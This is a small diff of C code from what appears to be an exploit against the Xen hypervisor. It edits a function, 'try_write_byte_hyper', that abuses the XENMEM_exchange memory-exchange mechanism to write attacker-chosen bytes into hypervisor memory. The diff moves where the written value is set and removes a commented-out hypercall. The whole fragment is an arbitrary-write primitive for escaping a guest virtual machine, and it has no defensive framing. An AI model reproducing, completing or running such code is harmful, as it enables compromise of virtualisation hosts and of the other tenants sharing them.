@@ -121,7 +121,7 @@ static int try_write_byte_hyper(u8 *dst, u8 val) {
   u64 target_addr = arbitrary_virt_to_machine(dst).maddr + 0xffff830000000000;
   u64 out_extent_base_addr, in_extent, nr_exchanged,
       nr_extents, in_extent_addr, in_extent_base;
-  u64 content;
+  u64 content = (u64) val;
   void *victim_page_virt;
   struct xen_memory_exchange args;
   unsigned long ret;
@@ -158,8 +158,6 @@ static int try_write_byte_hyper(u8 *dst, u8 val) {
     },
     .nr_exchanged = nr_exchanged
   };
-  // ret = HYPERVISOR_memory_op(XENMEM_exchange, &args);
-  content = (u64) val;
   ret = HYPERVISOR_arbitrary_access(
           args.out.extent_start + 8 * args.nr_exchanged,
           &content,
